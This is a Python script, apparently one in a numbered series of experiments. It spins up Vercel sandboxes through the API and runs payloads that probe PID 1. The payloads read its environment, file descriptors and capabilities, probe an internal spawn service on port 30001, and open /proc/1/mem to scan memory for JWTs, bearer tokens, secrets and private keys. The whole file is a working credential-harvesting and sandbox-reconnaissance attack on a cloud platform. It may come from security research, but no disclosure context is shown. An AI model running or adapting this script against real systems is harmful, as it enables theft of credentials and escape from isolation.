# 实验J240: 复核30001 + PID1内存大规模搜索(私钥/token/JWT/宿主URL) + /proc/1/root等
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj240"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) PID1 基本侦察: environ/root/cwd/fd/status
CODE_A = r'''
import os, subprocess
def p(*a): print(" ".join(str(x) for x in a), flush=True)
# environ (含 token?)
try:
    e = open("/proc/1/environ", "rb").read().replace(b"\x00", b"\n").decode(errors="replace")
    p("P1_ENV", e[:1500].replace(chr(10), "|"))
except Exception as ex:
    p("P1_ENV_EXC", repr(ex))
# root/cwd 与我们的对比
p("P1_ROOT", os.readlink("/proc/1/root"))
p("MY_ROOT", os.readlink("/proc/self/root"))
p("P1_CWD", os.readlink("/proc/1/cwd"))
p("P1_EXE", os.readlink("/proc/1/exe"))
# fd 列表
r = subprocess.run("ls -la /proc/1/fd/ 2>&1 | head -40", shell=True, capture_output=True, text=True, timeout=10)
p("P1_FD", (r.stdout + r.stderr)[:1500].replace(chr(10), "|"))
# status 关键行
st = open("/proc/1/status").read()
for k in ("Uid:", "Gid:", "CapEff:", "CapBnd:", "Seccomp:", "NoNewPrivs:", "NSpid:"):
    p("ST_" + k, [l for l in st.splitlines() if l.startswith(k)])
p("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_P1BASIC", timeout=100)

# B) 30001 无 patch 复核 (对照 J232 矛盾)
CODE_B = r'''
import urllib.request, urllib.error
def p(*a): print(" ".join(str(x) for x in a), flush=True)
for path in ("/x", "/vercel.sandbox.spawn.v1.SpawnService/Ping"):
    try:
        req = urllib.request.Request("http://127.0.0.1:30001" + path, data=b"{}", method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("Connect-Protocol-Version", "1")
        r = urllib.request.urlopen(req, timeout=4)
        p("G", path, r.status, r.read()[:100])
    except urllib.error.HTTPError as e:
        p("G", path, e.code, e.read()[:100])
    except Exception as e:
        p("G", path, "EXC", type(e).__name__, str(e)[:80])
# 存活确认
p("ALIVE", "pid", __import__("os").getpid())
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_30001", timeout=100)

# C) PID1 text段 dump 搜索敏感串 (re.finditer, C速度, 安全)
CODE_C = r'''
import os, re
def p(*a): print(" ".join(str(x) for x in a), flush=True)
fd = os.open("/proc/1/mem", os.O_RDWR)
# 段列表
maps = open("/proc/1/maps").read()
segs = []
for ln in maps.splitlines():
    parts = ln.split()
    if len(parts) < 6:
        continue
    addr, perm = parts[0], parts[1]
    path = parts[5] if len(parts) > 5 else ""
    if "sandbox-init" in path or "0x400000" in ln or ("rw-p" in perm and "libc" not in path):
        lo, hi = (int(x, 16) for x in addr.split("-"))
        segs.append((lo, hi, perm, path))
p("SEGS", len(segs))
# 读 text 段 (0x400000 到 0x8E0000 约5MB, 一次读完安全)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
TEXT_LO = 0x400000
TEXT_HI = 0x8E0000
data = ra(TEXT_LO, TEXT_HI - TEXT_LO)
p("TEXT", len(data))
# 搜索模式
pats = {
    "JWT": rb"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}",
    "BEARER": rb"[Bb]earer [A-Za-z0-9_\-\.]{16,}",
    "SECRET": rb"(?:secret|token|apikey|api_key|passwd|password|private[_-]?key)[\"']?\s*[:=]\s*[\"'][A-Za-z0-9_\-\./+]{16,}",
    "HOST": rb"https?://[a-zA-Z0-9\.\-]{6,60}",
    "SOCK": rb"/[a-zA-Z0-9_\-\./]{4,80}\.sock",
    "KEY64": rb"[A-Za-z0-9+/]{40,}={0,2}",
    "VERCEL": rb"vercel[a-zA-Z0-9_\-\.]{3,60}",
}
for name, pat in pats.items():
    try:
        m = re.findall(pat, data)
        p("HIT_" + name, len(m))
        for x in m[:6]:
            p("  ", x[:100])
    except Exception as e:
        p("ERR_" + name, repr(e))
p("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_DUMPTEXT", timeout=100)

# D) PID1 data/bss 段 dump (运行时凭据可能在这里)
CODE_D = r'''
import os, re
def p(*a): print(" ".join(str(x) for x in a), flush=True)
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
# 找 rw-p 段 (非 libc/非 [heap])
segs = []
for ln in open("/proc/1/maps"):
    parts = ln.split()
    if len(parts) < 2:
        continue
    addr, perm = parts[0], parts[1]
    path = parts[5] if len(parts) > 5 else ""
    if "rw-p" in perm and ("sandbox-init" in path or path == ""):
        lo, hi = (int(x, 16) for x in addr.split("-"))
        segs.append((lo, hi, path))
p("RWSEGS", len(segs))
allhits = {}
for lo, hi, path in segs:
    n = min(hi - lo, 6 * 1024 * 1024)  # 每段最多6MB
    try:
        d = ra(lo, n)
        p("SEG", hex(lo), hex(hi), len(d), path[:40])
        for name, pat in {
            "JWT": rb"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}",
            "BEARER": rb"[Bb]earer [A-Za-z0-9_\-\.]{16,}",
            "SECRET": rb"(?:secret|token|api[_-]?key|private[_-]?key)[\"']?\s*[:=]\s*[\"'][A-Za-z0-9_\-\./+]{16,}",
            "HOST": rb"https?://[a-zA-Z0-9\.\-]{6,60}",
            "SOCK": rb"/[a-zA-Z0-9_\-\./]{4,80}\.sock",
            "PEMKEY": rb"-----BEGIN [A-Z ]*PRIVATE KEY-----",
        }.items():
            for x in re.findall(pat, d):
                allhits.setdefault(name, set()).add(x[:120])
    except Exception as e:
        p("SEG_ERR", hex(lo), repr(e))
for name, s in allhits.items():
    p("HIT_" + name, len(s))
    for x in list(s)[:10]:
        p("  ", x[:120])
p("DONE_D", flush=True)
'''
run_cmd(sid, CODE_D, "D_DUMPDATA", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
